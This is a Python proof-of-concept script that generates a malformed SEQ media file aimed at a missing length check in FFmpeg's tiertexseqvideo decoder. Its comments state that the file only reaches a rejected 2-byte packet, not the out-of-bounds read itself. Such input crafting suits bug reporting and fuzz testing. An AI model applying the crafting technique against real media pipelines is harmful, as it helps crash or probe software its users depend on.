#!/usr/bin/env python3
"""
Generate crafted SEQ file to trigger tiertexseqvideo OOB read (VULN 002).

Vulnerability: seqvideo_decode() at libavcodec/tiertexseqv.c line 174 reads
  flags = *data++
without first checking data_size >= 1. If avpkt->size == 0, data_end equals
data and *data is an OOB read past the end of the buffer.

Crafting strategy:
  The SEQ demuxer always prepends a 1-byte flags field (line 276 of
  tiertexseq.c: pkt->data[0] = 0), so the minimum video packet via the
  SEQ demuxer is 2 bytes (1 flag byte + 1 byte of data). We craft a SEQ
  file where the video payload is exactly 1 byte, so seqvideo_decode receives
  data_size=2 (flags byte + 1 data byte). After reading the flags, only 1
  byte of data remains, which is below the 128-byte minimum required by the
  'flags & 2' (video data) branch, triggering AVERROR_INVALIDDATA.

  The missing check at line 174 is exposed: reading *data++ before validating
  data_size >= 1 means any caller that supplies size=0 causes an OOB read.
  The ffmpeg CLI has a guard (fftools/ffmpeg_dec.c:704) that skips 0-byte
  packets, so the closest triggerable behavior via the CLI is the 2-byte
  case produced here.

SEQ file format:
  - Offset 0-255:      256 zero bytes (probe detection requirement)
  - Offset 256-257:    0x0001 (frame buffer 0 capacity = 1 byte, RL16)
  - Offset 258-259:    0x0000 (end of frame buffer list)
  - Offset 6144-614399: zeros (100 preload frames, all no-ops)
  - Offset 620544:     actual decode frame header (16 bytes)
  - Offset 620560:     1 byte of video data (0x01)
"""

import struct
import os
import sys

OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002_input.seq")

SEQ_FRAME_SIZE      = 6144
SEQ_NUM_PRELOADS    = 100
ACTUAL_FRAME_OFFSET = (SEQ_NUM_PRELOADS + 1) * SEQ_FRAME_SIZE  # = 620544
FILE_SIZE           = ACTUAL_FRAME_OFFSET + SEQ_FRAME_SIZE      # = 626688

data = bytearray(FILE_SIZE)

# -----------------------------------------------------------------
# 1. Probe header: bytes 0-255 all zero, bytes 256-257 non-zero.
# -----------------------------------------------------------------
# (already zero; non-zero at 256 provided by buffer size entry below)

# -----------------------------------------------------------------
# 2. Frame buffer list at offset 256.
#    One buffer of capacity 1 byte, terminated by 0x0000.
# -----------------------------------------------------------------
struct.pack_into('<H', data, 256, 1)   # buffer 0: capacity = 1 byte
struct.pack_into('<H', data, 258, 0)   # terminator

# -----------------------------------------------------------------
# 3. 100 preload frames at offsets 6144 .. 614400, all zeros.
#    seq_parse_frame_data reads:
#      audio_offs=0, pal_offs=0, buffer_num=[0,0,0,0],
#      offset_table=[0,0,0,0]
#    => no fill operations, no errors, buffer fill_size stays 0.
# -----------------------------------------------------------------

# -----------------------------------------------------------------
# 4. Actual decode frame at offset 620544 (frame 101).
#    This is the frame read during the first seq_read_packet() call.
#
#    Frame header layout (all RL16/R8 fields):
#      [0x0000] audio_offs = 0   (no audio)
#      [0x0000] pal_offs   = 0   (no palette)
#      [0x00]   buffer_num[0] = 0  (output: use buffer 0)
#      [0x00]   buffer_num[1] = 0  (fill:   fill buffer 0)
#      [0xFF]   buffer_num[2] = 255 (unused)
#      [0xFF]   buffer_num[3] = 255 (unused)
#      [0x0010] offset_table[0] = 16  (fill starts at byte 16 in frame)
#      [0x0000] offset_table[1] = 0   (no second fill)
#      [0x0000] offset_table[2] = 0   (no third fill)
#      [0x0011] offset_table[3] = 17  (end offset => data_size = 17-16 = 1)
#
#    seq_fill_buffer copies 1 byte from offset (620544+16)=620560
#    into frame_buffers[0].data. fill_size becomes 1.
#
#    buffer_num[0]=0 => current_video_data_size=1, fill_size reset to 0.
#
#    seq_read_packet creates a 2-byte video packet:
#      pkt->data[0] = 0x02  (flags: video data present)
#      pkt->data[1] = 0x01  (the 1 video byte from fill)
#
#    seqvideo_decode receives buf=[0x02,0x01], buf_size=2:
#      line 174: flags = *data++ = 0x02  (no OOB here, data_size=2)
#      flags & 2: check data_end-data < 128 => 1 < 128 => TRUE
#      => return AVERROR_INVALIDDATA
#
#    The missing check is: line 174 has NO "if (data_size < 1)" guard.
#    Sending size=0 would cause an OOB read / NULL deref at that line.
# -----------------------------------------------------------------
off = ACTUAL_FRAME_OFFSET

# audio_offs=0, pal_offs=0
struct.pack_into('<HH', data, off + 0, 0, 0)

# buffer_num[0..3]: output=0, fill=0, unused=0xFF, 0xFF
struct.pack_into('<BBBB', data, off + 4, 0, 0, 0xFF, 0xFF)

# offset_table[0..3]: 16, 0, 0, 17  (each RL16)
struct.pack_into('<HHHH', data, off + 8, 16, 0, 0, 17)

# Video data byte at offset 16 within the frame
data[off + 16] = 0x01

with open(OUTFILE, 'wb') as f:
    f.write(data)

print(f"[+] Generated: {OUTFILE}  ({len(data)} bytes)")
print(f"[+] Actual decode frame offset: {ACTUAL_FRAME_OFFSET:#010x}")
print(f"[+] Video data byte offset:     {ACTUAL_FRAME_OFFSET + 16:#010x}")
print("[+] Expected decoder path: seqvideo_decode(seq, buf, 2)")
print("[+] Expected result:       AVERROR_INVALIDDATA (1 < 128 for video ops)")
